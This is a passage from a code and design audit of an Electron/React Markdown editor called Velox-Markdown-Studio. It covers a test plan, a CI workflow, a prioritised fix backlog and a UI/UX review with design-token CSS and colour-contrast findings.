| 8 | `togglePin` flips and persists; `deleteFileRecord` also deletes the handle key; `clearFileHistory` empties both stores | `src/services/storage.ts` |
| 9 | Reducer: `EDIT` sets `isDirty`; `MARK_SAVED` clears it; `CLOSE` picks the neighbour; `ACTIVATE null` shows Home; switching tabs preserves per-tab content + viewMode | `stores/documentStore.ts` |
| 10 | Hotkeys: `Ctrl+S`, `Ctrl+Shift+S`, `Ctrl+O`, `Ctrl+N`, `Ctrl+K`, `Ctrl+W`, `F1`, `Ctrl+/` each fire once and `preventDefault`; **listener count does not grow across re-renders** | `src/hooks/useHotkeys.ts` |
| 11 | `MarkdownPreview`: debounce means `parseMarkdown` is called ≤1 per 180 ms burst; empty content renders "Empty Document"; checkbox click maps to the right source line | `src/components/MarkdownPreview.tsx` |
| 12 | ErrorBoundary catches a throwing child, shows the fallback, recovers on Retry | `src/app/ErrorBoundary.tsx` |

```yaml
# .github/workflows/ci.yml — add alongside build-windows-exe.yml
name: CI
on: [push, pull_request]
jobs:
  verify:
    runs-on: windows-latest          # match the app's target OS (A16)
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version-file: .nvmrc, cache: npm }
      - run: npm ci --no-audit --no-fund
      - run: npm run lint
      - run: npm run typecheck
      - run: npm run test:coverage
      - run: npm run format:check
      - run: npm run build
```

---

### Prioritized backlog

| # | Item | Effort | Impact | Category |
|---|---|---|---|---|
| 1 | Fix `npm install`: remove the `esbuild ^0.25.0` pin, add `overrides: {esbuild:"^0.28.2"}`, delete `tsx` (A1) | **S** | 🔴 **Blocks everything** — no clone installs, CI is red | Build tooling |
| 2 | Add `ErrorBoundary` at root + around editor/modal; add `beforeunload` guard for dirty tabs (A3) | **S** | 🔴 Prevents total data loss on any render throw | Resilience |
| 3 | Debounce preview parse 180 ms + `beforeinput`-free split of editor vs render; fix `calculateWordCount` O(1)-space (A4, A5) | **M** | 🔴 5-20× keystroke latency improvement | Performance |
| 4 | `highlight.js` → `lib/core` + 7 registered languages; **never** `highlightAuto`; ship both themes (A2) | **S** | 🔴 Large bundle cut + removes ~190-grammar loop per fence | Performance |
| 5 | Install ESLint 9 flat + `typescript-eslint` type-checked + `react-hooks` + Prettier + husky/lint-staged (A11) | **M** | 🔴 Catches the entire class of hook-dep and `any` bugs | DX |
| 6 | Delete 9 unused packages; move 7 build/type packages to `devDependencies` (A21) | **S** | 🟠 Cleaner tree, smaller install, no stale AI metadata | Build tooling |
| 7 | Extract `useDocumentStore` (zustand) from `App`; delete `tabs`/`activeTabId` `useState` pair (A2 table) | **L** | 🟠 Unblocks memoization; kills the prop-drilling chain | Architecture |
| 8 | Add `React.memo` to all 12 presentational components once #7 lands (A15) | **S** | 🟠 Removes ~40 wasted button renders per keystroke | Performance |
| 9 | Enable `strict` + `noUncheckedIndexedAccess` + `noUnusedLocals`; delete the 7 `any`s; add `src/types/fs.d.ts` (A8, A9) | **M** | 🟠 Catches real bugs; expect ~40 errors on day one | Type safety |
| 10 | Add `preload.cjs` + `ipc.cjs` + typed `VeloxBridge`; capability-detect with FS Access fallback (A6) | **L** | 🟠 Fixes broken window controls; unlocks real file I/O + atomic saves | Architecture |
| 9b | Upgrade `electron` `^33.2.1` → `^44.5.1` (11 majors; no current Chromium patches) (A22) | **M** | 🟠 Security patches for a local-file editor | Security |
| 11 | One debounced search over a prebuilt lowercase index; delete the 2 duplicate implementations (A12) | **M** | 🟠 Removes O(corpus)-per-keystroke on 3 code paths | Performance |
| 12 | Replace the fake `C:\Users\Windows\Documents\` paths; key records by handle/hash, not path (A7) | **M** | 🟠 Correctness: files no longer overwrite each other | Correctness |
| 13 | `React.lazy` + `Suspense` for `ExportModal`/`CommandPalette`/`SampleFilesModal`; mount only the open modal (A15, A25) | **S** | 🟠 Kills 2 full markdown parses per keystroke behind a closed modal | Performance |
| 14 | Extract `useHotkeys`, `useToast`, `useModalStack`, `useScrollSync`, `useFileDrop`, `useFsAccess` (A20) | **L** | 🟡 `App.tsx` 998 → ~80 lines | Architecture |
| 15 | Fix the 17 un-`clearTimeout`'d timers and the stale-closure hydration effect (A20) | **M** | 🟡 Memory + correctness under fast interaction | Resilience |
| 16 | Consolidate the 7 duplicated `MarkdownFileRecord` literals into `makeFileRecord`; drop `FileHistoryItem` + `FILE_HISTORY` (A13) | **S** | 🟡 One place to change; halves write amplification | Code quality |
| 17 | Delete `cursorLine`/`cursorCol` from `FileTab`; derive `isDirty`; read real line endings (A14) | **S** | 🟡 Removes a silent two-sources-of-truth bug | Code quality |
| 18 | `useFsAccess` + `5 MB` file-size guard with a user-facing toast; 10 MB → friendly rejection (A5) | **M** | 🟡 Bounded memory; actionable failure UX | Resilience |
| 19 | Cross-platform `clean` (no `rm -rf`); drop the nonexistent `server.js` (A16) | **S** | 🟡 `npm run clean` works on the target OS | Build tooling |
| 20 | Pick one package manager: `bun.lock` → `package-lock.json`, add `packageManager` + `engines`, CI uses `npm ci` (A17) | **S** | 🟡 Reproducible builds; CI stops ignoring the lockfile | Build tooling |
| 21 | Vitest + `@testing-library/react` + happy-dom + `fake-indexeddb`; land test cases #1-5 (A18) | **M** | 🟡 Locks down parser + metrics + search | Testing |
| 22 | Land test cases #6-8 (storage against a fake IDB) | **M** | 🟡 Locks down persistence + fallback | Testing |
| 23 | Land test cases #9-10 (store reducer, hotkey registry) | **M** | 🟡 Locks down the extracted architecture | Testing |
| 24 | Land test cases #11-12 (preview debounce, ErrorBoundary) | **S** | 🟡 Guards the two highest-risk perf/UX fixes | Testing |
| 25 | Virtualize the line-number gutter + block-chunk the preview (A19) | **L** | 🟡 Raises the document-size ceiling by ~2 orders of magnitude | Performance |
| 26 | Add `build.target: 'chrome128'`, `manualChunks`, `sourcemap: false`, `chunkSizeWarningLimit` (A25) | **S** | 🟡 Cacheable vendor chunks; matches Electron's Chromium | Build tooling |
| 27 | `server.host: '127.0.0.1'`; drop `--host=0.0.0.0` (A10) | **S** | 🟡 Closes LAN exposure of the dev server | Security |
| 28 | Delete `usePWAInstall`, `getFileHistory`, `FileHistoryItem`, `AccentColor`, unused icons; `noUnusedLocals` catches the rest (A27) | **S** | 🟡 ~150 dead lines removed | Code quality |
| 29 | Add `LICENSE` (Apache-2.0, backs the SPDX header), `README`, `.editorconfig`, `.nvmrc`, CHANGELOG (A26) | **S** | 🟡 Legal exposure closed; onboarding | DX |
| 30 | Native `before-quit` veto when tabs are dirty; atomic save via temp-file + rename in `ipc.cjs` | **M** | 🟡 No data loss on quit; no truncated writes | Resilience |
| 31 | Upgrade `lucide-react` to `^1.52.0`; verify tree-shaking (A22) | **S** | 🟡 Unfreeze a pre-1.0 range | Build tooling |
| 32 | Convert `src/` to `@/` imports or delete the dead alias; add a config-parity test (A24) | **M** | 🟡 Removes dead config and its drift risk | Code quality |
| 33 | Decompose `CommandBar` (20 props) into `FileActions` + `ViewModeSwitch` + `FormatTools` + `ZoomControls` | **M** | 🟡 Smaller render surface, testable units | Architecture |
| 34 | Split `HomePage` (529 lines) into `Hero`, `SearchPanel`, `SearchResults`, `PinnedGrid`, `RecentFilesTable` | **M** | 🟡 Largest component after `App`; enables memo + virtualization | Architecture |
| 35 | Move `FileSystemFileHandle` out of tab objects into a non-reactive `Map` (A23) | **S** | 🟡 Makes tabs serializable → enables `persist` + devtools | Architecture |
| 36 | Accessibility: focus traps + `aria-*` on all 5 modals; restore focus on close | **M** | 🟡 Modals currently trap nothing | Product |
| 37 | autosave/crash-recovery draft snapshot in IDB (debounced 2 s) | **M** | 🟡 Recovers work after a crash | Product |
| 38 | Unify the 3 shortcut sources (`ShortcutsModal.tsx:16` list vs `App.tsx:642` vs `RawEditor.tsx:106`) into one registry | **M** | 🟡 `Ctrl+P` is documented but **not implemented** — verified in `App.tsx:641-672` | Correctness |

**Highest-leverage first five:** #1 (unblocks all work) → #2 + #3 (make it not lose data and not feel broken) → #4 (one-import bundle win) → #5 (stops the bugs from recurring).

---

## 6. UI/UX & Visual Design Audit

**Target:** `Velox-Markdown-Studio` — Electron 33 + React 19 + Tailwind v4.3 + lucide-react + marked 18 + highlight.js 11
**Stack reality check:** `motion` (framer-motion) is in `package.json:48` and **imported nowhere**. `@google/genai`, `express`, `jszip` are also dead dependencies. `tailwindcss-animate` is **not** installed, `tailwind-typography` is **not** installed.

---

## Visual system

### What tokens actually exist

`src/index.css` is 394 lines. **There is no `@theme` block. There is no `@plugin`. There is no `@custom-variant`.** The entire "design system" is:

| Token class | Actual content | Location |
|---|---|---|
| `--accent-blue` | `#0078d4` | `index.css:6` |
| `--accent-cyan` | `#00b7c3` | `index.css:7` |
| `--accent-purple` | `#8764b8` | `index.css:8` |
| scrollbar sizing | `10px × 10px` only | `index.css:13-16` |
| scrollbar colors | 6 hardcoded `rgba()`/`hex` per theme | `index.css:18-50` |
| markdown body | `1.05rem` / `1.75` / system sans | `index.css:55-59` |
| markdown colors | **48 hardcoded hex/rgba values** | `index.css:80-251` |
| heading scale | `2.15 / 1.65 / 1.35 / 1.15 rem` | `index.css:254-282` |
| markdown radii | `0.35rem`, `0.6rem`, `0.75rem` | `index.css:360,316,338,368` |

**The three `--accent-*` variables are referenced zero times** anywhere in the repo (verified by grep). `AppSettings.accentColor` (`types/index.ts:59`), `lineNumbers`, `autoSave`, `defaultViewMode` (`storage.ts:12-21`) are also **written and read by nothing**. This is the root cause of everything below: there is no token layer, so every component invented its own values.

### What the components actually use (measured, not estimated)

| Dimension | Distinct values in use | Count |
|---|---|---|
| Font sizes | 6 Tailwind (`10,11,12,14,16,24px`) + 8 in CSS (`1.15,1.35,1.65,2.15rem`, `0.92em,0.96,0.98,1.05rem`) | **14** |
| Font weights | `medium`(37) `semibold`(37) `bold`(10) | 3 |
| Radii | `rounded`(42) `rounded-lg`(23) `rounded-xl`(18) `rounded-2xl`(13) `rounded-full`(8) `rounded-md`(7) `rounded-t`(2) `rounded-3xl`(1) + 3 CSS rem radii | **11** |
| Shadows | `xs,2xs,sm,md,lg,2xl,inner` + 9 tinted variants (`shadow-sky-900/30`, `shadow-sky-950/20`, …) | **16** |
| Icon colors | `sky-400,500,600,700,300`, `amber-400,500,600,900`, `emerald-400,500,600`, `purple-400,500,700`, `indigo-500`, `rose-400,600` | **19 hues** |
| Icon sizes | `w-3, w-3.5, w-4, w-4.5, w-5, w-12, w-14` | 7 |
| Button heights in the 40px toolbar | `p-1`(22px), `px-2.5 py-1`(24px), `p-1.5`(26px) | 3 |

### Tailwind v4 `@theme` block — replace `index.css:1-10` entirely

```css
@import "tailwindcss";
@import "highlight.js/styles/github-dark-dimmed.css";

/* CRITICAL: make `dark:` follow the app's theme class, not the OS */
@custom-variant dark (&:where(.dark, .dark *));

@theme {
  --font-sans: "Segoe UI Variable Text", "Segoe UI", Inter, system-ui, sans-serif;
  --font-mono: "Cascadia Mono", "Cascadia Code", Consolas, "JetBrains Mono", monospace;

  --text-2xs: 0.6875rem;   /* 11px  */
  --text-xs:  0.75rem;     /* 12px  */
  --text-sm:  0.8125rem;   /* 13px  */
  --text-base:0.875rem;    /* 14px  */
  --text-md:  1rem;        /* 16px  */
  --text-lg:  1.125rem;    /* 18px  */
  --text-xl:  1.375rem;    /* 22px  */
  --text-2xl: 1.75rem;     /* 28px  */
  --text-3xl: 2.25rem;     /* 36px  */
  --text-4xl: 3rem;        /* 48px  */

  --radius-xs: 4px;  --radius-sm: 6px;  --radius-md: 8px;
  --radius-lg: 10px; --radius-xl: 14px; --radius-2xl: 18px;

  --shadow-1: 0 1px 2px rgb(0 0 0 / .20);
  --shadow-2: 0 4px 12px -2px rgb(0 0 0 / .28), 0 2px 4px -2px rgb(0 0 0 / .20);
  --shadow-3: 0 16px 48px -12px rgb(0 0 0 / .48), 0 4px 12px -4px rgb(0 0 0 / .32);

  --ease-out: cubic-bezier(.16,1,.3,1);
  --dur-1: 120ms; --dur-2: 180ms; --dur-3: 260ms;
}
```

### Design tokens (single source of truth) — replace `index.css:4-10`

```css
:root, .dark {
  --surface-0:#0A0E17; --surface-1:#0E1420; --surface-2:#141B2B;
  --surface-3:#1B2436; --surface-4:#232E42;
  --border-subtle:#1B2436; --border-default:#26314A; --border-strong:#35425F;
  --text-primary:#E6EDF7; --text-secondary:#A9B6CB; --text-tertiary:#7C8AA3; --text-disabled:#55627A;
  --accent-200:#BAE6FD; --accent-300:#7DD3FC; --accent-400:#38BDF8;
  --accent-500:#0EA5E9; --accent-600:#0284C7; --accent-700:#0369A1;
  --success-400:#34D399; --warning-400:#FBBF24; --danger-400:#F87171;
  --code-bg:#080C14; --code-header:#0E1420;
}
.light {
  --surface-0:#FFFFFF; --surface-1:#F8FAFC; --surface-2:#F1F5F9;
  --surface-3:#E8EDF4; --surface-4:#DCE3EC;
  --border-subtle:#EEF2F7; --border-default:#D9E1EC; --border-strong:#B9C4D4;
  --text-primary:#0F172A; --text-secondary:#475569; --text-tertiary:#64748B; --text-disabled:#94A3B8;
  --accent-200:#E0F2FE; --accent-300:#7DD3FC; --accent-400:#38BDF8;
  --accent-500:#0EA5E9; --accent-600:#0284C7; --accent-700:#0369A1;
  --success-400:#047857; --warning-400:#B45309; --danger-400:#B91C1C;
  --code-bg:#0F172A; --code-header:#1E293B;
}
```

**Semantic rule that replaces the 19-hue rainbow:** *all chrome icons inherit `--text-secondary`. `--accent-*` is reserved exclusively for the active/selected state and links. `--success/warning/danger-*` are reserved exclusively for status. No other hue may appear in the shell.* This single rule removes 16 of the 19 colors.

---

## Findings

### Visual system integrity

#### [HIGH] U1. There is no `@theme` — every value is invented per-component
- **File:** `src/index.css:1-10`, consumed across `src/components/*.tsx`
- **Current:** `@import "tailwindcss";` then a `@layer base { :root { --accent-blue… } }` that nothing reads.
- **Problem:** The 3 declared tokens are dead. Components reach for `slate-900`, `slate-800`, `slate-950`, `#0d1117`, `#090d16`, `#090d16`, `#0078d4`, `#0284c7` independently. There is no way to retheme without editing 13 files.
- **Fix:** Paste the `@theme` + token blocks above, then delete `index.css:4-10`.

#### [HIGH] U2. `dark:` variants are driven by the OS, not the app's theme toggle
- **File:** 18 occurrences — `CommandBar.tsx:91,314,354`, `CommandPalette.tsx` (none), `ExportModal.tsx:114,144,174,218`, `HomePage.tsx:156,229,325,365,456,474`, `StatusBar.tsx:35,40,45,62,88`
- **Current:** `className="w-4 h-4 text-sky-600 dark:text-sky-400"` (`CommandBar.tsx:91`)
- **Problem:** Tailwind v4 compiles `dark:` to `@media (prefers-color-scheme: dark)` unless a variant is registered. There is no `@custom-variant dark` in `index.css`. So on a Windows machine set to **light** with the app theme **dark**, every one of these 18 elements renders the *light-mode* color. The New button's icon goes near-invisible, StatusBar's "Unsaved changes" amber goes muddy, the File History heading turns dark-grey on a dark card. This is a real, visible, frequently-hit bug.
- **Fix:** Add `@custom-variant dark (&:where(.dark, .dark *));` as the first line of `index.css`, then delete all 18 `dark:` prefixes and drive color from `isLight` ternaries like the rest of the codebase.

#### [HIGH] U3. Two hardcoded hex near-blacks outside the palette
- **File:** `src/components/RawEditor.tsx:237`, `src/components/RawEditor.tsx:328`
- **Current:**
  ```tsx
  isLight ? 'bg-white text-slate-900' : 'bg-[#0d1117] text-slate-100'   // :237
  isLight ? 'bg-slate-50 border-slate-200 text-slate-400' : 'bg-[#090d16] border-slate-800/80 text-slate-600'  // :328
  ```
- **Problem:** `#0d1117` is GitHub's editor black and `#090d16` is a third unrelated value. Neither is in the slate ramp, so the gutter and the editor body are two different blacks with a 1px border between them — and neither matches `bg-slate-950` used by the preview pane beside it. In split mode you get three adjacent near-blacks (`#0d1117`, `#090d16`, `#020617`).
- **Fix:**
  ```tsx
  isLight ? 'bg-[var(--surface-0)] text-[var(--text-primary)]'
          : 'bg-[var(--surface-0)] text-[var(--text-primary)]'                       // :237
  isLight ? 'bg-[var(--surface-1)] border-[var(--border-subtle)] text-[var(--text-tertiary)]'
          : 'bg-[var(--surface-1)] border-[var(--border-subtle)] text-[var(--text-tertiary)]'  // :328
  ```

#### [HIGH] U4. Inline `style={{}}` bypasses the design system in four places
- **File:** `RawEditor.tsx:330`, `RawEditor.tsx:355-360`, `MarkdownPreview.tsx:143`, `ImageLightboxModal.tsx:89`
- **Current:**
  ```tsx
  style={{ fontSize: `${fontSize}px` }}                                  // RawEditor:330
  style={{ fontSize: `${fontSize}px`,
          fontFamily: '"Cascadia Code", Consolas, "Fira Code", monospace',
          lineHeight: '1.5rem', tabSize: 2 }}                            // RawEditor:355-360
  style={{ fontSize: `${fontSize}px` }}                                  // MarkdownPreview:143
  style={{ transform: `scale(${scale})`, transformOrigin: 'center center' }}  // Lightbox:89
  ```
- **Problem:** Three different monospace stacks now exist: Tailwind's `font-mono`, `RawEditor`'s inline string, and `index.css:361`/`index.css:374`'s `"Cascadia Code", Consolas, "Fira Code", monospace`. Font size is set inline, so it **cannot** be themed or made zoom-relative (see U7).
- **Fix:** Delete all four inline styles. `RawEditor.tsx:236` already has `font-mono` on the wrapper; move the rest into `@theme` (`--font-mono`) and set size via `style={{ fontSize: 'var(--editor-font-size)' }}` only where genuinely dynamic, or better, a CSS class driven by a `--preview-scale` var on `:root`.

#### [HIGH] U5. CSS after `index.css:10` is **unlayered**, so it silently overrides every Tailwind utility
- **File:** `src/index.css:12-394` (all of it)
- **Problem:** The `@layer base { … }` block closes at line 10. Everything after — the scrollbar rules, the entire `.markdown-body` engine — is unlayered. In CSS, **unlayered author styles beat layered ones**. Tailwind v4 puts utilities in `@layer utilities`. So every rule in lines 12-394 outranks any Tailwind class. Consequences:
  - `markdown.ts:68` emits `<pre class="p-4 …">` but `index.css:373-379` `.markdown-body pre code { padding: 1.25rem }` also applies → **36px of horizontal padding on every code block.**
  - `markdown.ts:18` emits `max-h-[500px]` on images while `index.css:313-323` independently sets `margin: 1.4rem auto` on the same `<img>` inside a `<figure class="my-5">` → double vertical margin.
  - Every Tailwind class in `markdown.ts`'s HTML output is decorative; nothing in it works as written.
- **Fix:** Wrap lines 12-394 in `@layer components { … }` so utilities win, then delete the duplicate declarations from the renderer (see U22, U24). One source of truth per property.

#### [HIGH] U6. Five dead animation classes on every modal and the toast
- **File:** `App.tsx:774,926`, `CommandPalette.tsx:189,193`, `ExportModal.tsx:59`, `HomePage.tsx:193`, `ImageLightboxModal.tsx:33`, `RawEditor.tsx:241`, `SampleFilesModal.tsx:21`, `ShortcutsModal.tsx:113`
- **Current:** `className="fixed inset-0 z-50 … bg-black/70 backdrop-blur-sm animate-in fade-in select-none"` (`CommandPalette.tsx:189`)
- **Problem:** `animate-in`, `fade-in`, `slide-in-from-bottom-2`, `zoom-in-95` are `tailwindcss-animate` plugin classes. That plugin is **not** in `package.json`. These 11 class usages compile to nothing. **Every modal, the lightbox, the find bar and the toast pop in instantly with zero transition** — which is a large part of why the app "feels cheap." The same applies to `no-scrollbar` (`TabBar.tsx:25`, `CommandBar.tsx:79`).
- **Fix:** Since `motion` is already installed and unused, actually use it:
  ```tsx
  import { AnimatePresence, motion } from 'motion/react';
  <AnimatePresence>
    {isOpen && (
      <motion.div className="fixed inset-0 z-50 grid place-items-center bg-black/70 backdrop-blur-sm"
        initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
        transition={{ duration: 0.15, ease: [0.16, 1, 0.3, 1] }} role="presentation" onClick={onClose}>
        <motion.div role="dialog" aria-modal="true"
          initial={{ opacity: 0, scale: 0.97, y: 8 }} animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.98, y: 4 }}
          transition={{ duration: 0.18, ease: [0.16, 1, 0.3, 1] }}>
  ```
  And add to `index.css`: `.no-scrollbar { scrollbar-width: none } .no-scrollbar::-webkit-scrollbar { display: none }`.

#### [HIGH] U7. Zoom only scales inherited text — headings, quotes, code, tables never resize
- **File:** `src/components/MarkdownPreview.tsx:143` vs `src/index.css:255,263,271,279,289,334,344,362,375`
- **Current:** `style={{ fontSize: `${fontSize}px` }}` on the scroll container; then `.markdown-body h1 { font-size: 2.15rem }`, `blockquote { font-size: 1.05rem }`, `table { font-size: .98rem }`, `pre code { font-size: .96rem }`, `code:not(pre code) { font-size: .92em }`.
- **Problem:** Inline font-size on the container only affects elements that **inherit**. Every descendant with an explicit `rem`/`em` size ignores it. At the zoom maximum (`App.tsx:828`, 32px) body text is 32px while `h1` stays **34.4px** and code stays **15.4px** — the document looks structurally broken. At the minimum (11px, `App.tsx:835`) `h1` is *3× the body size*. The zoom control is a headline feature and it is fundamentally broken.
- **Fix:** Drive everything off one CSS var set on the container, in `em`/`%`, never `rem`:
  ```css
  .markdown-body { font-size: var(--preview-fs, 16px); line-height: 1.7; }
  .markdown-body h1 { font-size: 2.1em; }   /* not 2.15rem */
  .markdown-body h2 { font-size: 1.6em; }
  .markdown-body h3 { font-size: 1.32em; }
  .markdown-body h4 { font-size: 1.14em; }
  .markdown-body blockquote { font-size: 1em; }
  .markdown-body table { font-size: .95em; }
  .markdown-body pre code { font-size: .9em; }
  ```
  ```tsx
  // MarkdownPreview.tsx:143
  style={{ ['--preview-fs' as string]: `${fontSize}px` }}
  ```

#### [MEDIUM] U8. Three separate `transition` durations and zero easings
- **File:** `duration-150` ×10, `duration-200` ×1, `duration-300` ×1 (`index.css:321`), `duration-100` ×1 (`CommandPalette.tsx:193`)
- **Current:** `transition` with no timing function — 73 usages
- **Problem:** Bare `transition` in Tailwind means `transition-property: color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter` at **150ms linear-ish** default easing. Because `transform` is included, `hover:scale-[1.02]` (`HomePage.tsx:113`) and `hover:translate-y-[-2px]` (`HomePage.tsx:317`) animate layout-adjacent properties, which is why the pinned cards feel floaty.
- **Fix:** Define `--ease-out: cubic-bezier(.16,1,.3,1)` in `@theme` (above), then use `transition-colors duration-150 ease-[var(--ease-out)]` for color and `transition-transform duration-200 ease-[var(--ease-out)]` for movement. Never bare `transition`.

#### [MEDIUM] U9. Radius scale has 11 values and 3 are non-token rem values
- **File:** `index.css:316` (`0.6rem` images/tables/blockquote), `index.css:338` (`0.6rem` table), `index.css:360` (`0.35rem` inline code), `index.css:368` (`0.75rem` pre)
- **Current:** `.markdown-body blockquote { border-radius: 0 0.6rem 0.6rem 0 }`
- **Problem:** `0.35rem` = 5.6px, `0.6rem` = 9.6px, `0.75rem` = 12px, `rounded-md` = 6px, `rounded-lg` = 8px, `rounded-xl` = 12px, `rounded-2xl` = 16px, `rounded-3xl` = 24px. Five *different* values compute to "about 6px" and two compute to "about 12px". Nothing matches.
- **Fix:** In the new stylesheet use only: `var(--radius-sm)` inline code, `var(--radius-md)` inputs/buttons, `var(--radius-lg)` cards/tables/images, `var(--radius-xl)` modals.

#### [MEDIUM] U10. Elevation scale has 16 values, 9 of them tinted
- **File:** `HomePage.tsx:113` (`shadow-md shadow-sky-900/30`), `:86` (`shadow-sky-950/40`), `:317` (`shadow-slate-200/50`), `ExportModal.tsx:63` (`shadow-2xl`), `RawEditor.tsx:241` (`shadow-2xl`)
- **Problem:** A card, a modal, a toolbar and a toast all sit at different elevations with different shadow colors. There is no rule for what floats above what.
- **Fix:** Three steps only — `--shadow-1` (resting cards, tabs), `--shadow-2` (menus, popovers, find bar), `--shadow-3` (modals, lightbox, toast). Tinted shadows are a dark-mode crutch; with the surface ladder above they are unnecessary.

#### [LOW] U11. Scrollbar base rule has no thumb or track
- **File:** `src/index.css:13-16`
- **Current:** `::-webkit-scrollbar { width: 10px; height: 10px; }` — nothing else, outside any theme selector.
- **Problem:** The thumb/track rules are keyed to `html.dark` / `html.light`, which are set imperatively by JS (`App.tsx:115-116`, `index.html:20-29`). Before that script runs, and in any context where the classes are absent, scrollbars are **10px wide with an invisible thumb**.
- **Fix:** Define the base thumb in the unlayered block and only override per theme:
  ```css
  ::-webkit-scrollbar { width: 10px; height: 10px; }
  ::-webkit-scrollbar-thumb { background: var(--border-strong); border-radius: 6px; border: 2px solid transparent; background-clip: padding-box; }
  ::-webkit-scrollbar-thumb:hover { background: var(--text-disabled); }
  ::-webkit-scrollbar-corner { background: transparent; }
  ```

#### [LOW] U12. `accent-color` and theme-color use a fourth blue
- **File:** `index.css:384` (`accent-color: #0078d4`), `index.css:134` (`border-left: 4px solid #0078d4`), `index.html:12` (`theme-color #0078d4`), `vite.config.ts:23-24` (`#0f172a`), `electron/main.cjs:16` (`backgroundColor: '#0f172a'`)
- **Problem:** The app's UI accent is sky-600 `#0284c7`. The markdown blockquote rule, the checkbox tint and the browser theme-color are `#0078d4`. The PWA manifest and window background are `#0f172a` (slate-900), while the app root is `bg-slate-950` `#020617`.
- **Fix:** Set `accent-color: var(--accent-500)`. Set blockquote border to `var(--accent-500)`. Set `theme-color` to `#0A0E17` in `index.html:12` and `#0A0E17` in `vite.config.ts:23-24` and `electron/main.cjs:16` to match `--surface-0`.

---

### Color & contrast

Measured against the actual composited backgrounds (alpha blends resolved):

| Token pair | Ratio | Need | Verdict | Location |
|---|---|---|---|---|
| `text-slate-600` on `#090d16` (line numbers) | **2.56** | 4.5 | **FAIL** | `RawEditor.tsx:328` |
| `placeholder-slate-600` on `#0d1117` | **2.50** | 4.5 | **FAIL** | `RawEditor.tsx:353` |
| `#94a3b8` on `bg-slate-200/90` (light tab separator) | **1.23** | 3.0 | **FAIL** | `TabBar.tsx:26` |
| white on `bg-sky-600` — all active toolbar segments | **4.10** | 4.5 | **FAIL** | `CommandBar.tsx:154,169,184` |
| white on `bg-sky-600` — Replace button | **4.10** | 4.5 | **FAIL** | `RawEditor.tsx:306` |
| `#0284c7` link on white (light markdown link) | **4.10** | 4.5 | **FAIL** | `index.css:199` |
| `#0284c7` file icon on white (light active tab) | **4.10** | 3.0 | pass(UI) | `TabBar.tsx:74` |
| `text-slate-500` on `bg-slate-900/90` (dark meta) | **3.82** | 4.5 | **FAIL** | `HomePage.tsx:206,241,290,348` |
| `text-slate-500` on `bg-slate-950/80` (dark snippet bg) | **3.86** | 4.5 | **FAIL** | `HomePage.tsx:279,283` |
| `text-slate-500` on `bg-slate-950/80` (palette footer) | **3.86** | 4.5 | **FAIL** | `CommandPalette.tsx:264` |
| `text-slate-500` on `bg-slate-950/80` (shortcuts footer) | **3.86** | 4.5 | **FAIL** | `ShortcutsModal.tsx:243` |
| `text-slate-500` on `bg-slate-950/60` (export card label) | **3.98** | 4.5 | **FAIL** | `ExportModal.tsx:118,148,178` |
| `text-slate-500` on `bg-slate-950/40` (sample card meta) | **4.06** | 4.5 | **FAIL** | `SampleFilesModal.tsx:67` |
| `slate-400` on `sky-500/40` (word-wrap "on" state) | **3.37** | 4.5 | **FAIL** | `CommandBar.tsx:314` |
| `slate-500/40` on `slate-950` track (scrollbar thumb) | **4.06** | 3.0 | pass | `index.css:23` |
| `#d97706` (amber-600) on white (light "Unsaved") | **3.19** | 4.5 | **FAIL** | `StatusBar.tsx:35` |
| `#94a3b8` on `#F1F5F9` (light line numbers) | **2.34** | 4.5 | **FAIL** | `RawEditor.tsx:328` |
| `#38bdf8` on `slate-700/70` (dark inline code) | 6.28 | 4.5 | pass | `index.css:123` |
| `#7dd3fc` on `slate-950` (dark link hover) | 12.10 | 4.5 | pass | `index.css:118` |
| `#f8fafc` on `slate-800/90` (dark `th`) | 14.55 | 4.5 | pass | `index.css:146` |
| `#cbd5e1` on `slate-950 + sky/10` (dark blockquote) | 12.25 | 4.5 | pass | `index.css:136` |
| `#020617` on `#fcd34d` (search highlight) | 13.99 | 4.5 | pass | `HomePage.tsx:280` |

#### [HIGH] C1. Line numbers are illegible in both themes
- **File:** `src/components/RawEditor.tsx:328`
- **Current:** `bg-[#090d16] … text-slate-600` (dark) / `text-slate-400` on `bg-slate-50` (light)
- **Problem:** **2.56:1** and **2.34:1**. The gutter is the one element a user stares at continuously while navigating a document, and it is unreadable.
- **Fix:** `text-[var(--text-tertiary)]` — `#7C8AA3` on `#0A0E17` = **5.53:1**; `#64748B` on `#F1F5F9` = **4.34:1**. Add `tabular-nums` so digits don't jitter.

#### [HIGH] C2. `text-slate-500` is used as body-size metadata on dark cards everywhere — 20 call sites, all fail
- **File:** `HomePage.tsx:206,241,290,348,393`; `CommandPalette.tsx:264`; `ShortcutsModal.tsx:243`; `ExportModal.tsx:118,148,178`; `SampleFilesModal.tsx:67`
- **Current:** `<p className="text-xs text-slate-500 mt-1 max-w-sm mx-auto">` (`HomePage.tsx:393`)
- **Problem:** 3.82–4.06:1. Slate-500 is the single most-used "muted" token in the app and it does not clear AA on any dark surface above `slate-900`.
- **Fix:** Global find-and-replace of `text-slate-500` → `text-[var(--text-tertiary)]` (`#7C8AA3`, 5.28:1 on `--surface-1`, 4.93:1 on `--surface-2`).

#### [HIGH] C3. Active toolbar segments and the Replace button are 4.10:1
- **File:** `CommandBar.tsx:154,169,184`; `RawEditor.tsx:306`; `ExportModal.tsx:199,209`; `CommandBar.tsx:112` (Save), `HomePage.tsx:113,252,399,501`
- **Current:** `bg-sky-600 text-white font-semibold shadow-xs` (`CommandBar.tsx:154`)
- **Problem:** **4.10:1** — fails AA for 12px text. Every selected state and every primary button in the app is one step too light. `bg-sky-600` is used for 10 separate primary actions.
- **Fix:** Dark theme → `bg-[var(--accent-500)] text-[var(--surface-0)]` = **6.96:1**. Light theme → `bg-[var(--accent-700)] text-white` = **5.93:1**. This is the GitHub/VSCodium pattern and it also stops the selected segment from glowing.

#### [HIGH] C4. Light-theme markdown link fails AA
- **File:** `src/index.css:199`, `:204`
- **Current:** `html.light .markdown-body a { color: #0284c7; }` / `:hover { #0369a1 }`
- **Problem:** **4.10:1** on white for the resting state. The hover state is the only one that passes (5.93:1), so links get *more* readable only on hover — backwards.
- **Fix:** `color: var(--accent-700)` (5.93:1); hover `var(--accent-600)` with `text-decoration-thickness: 2px`.

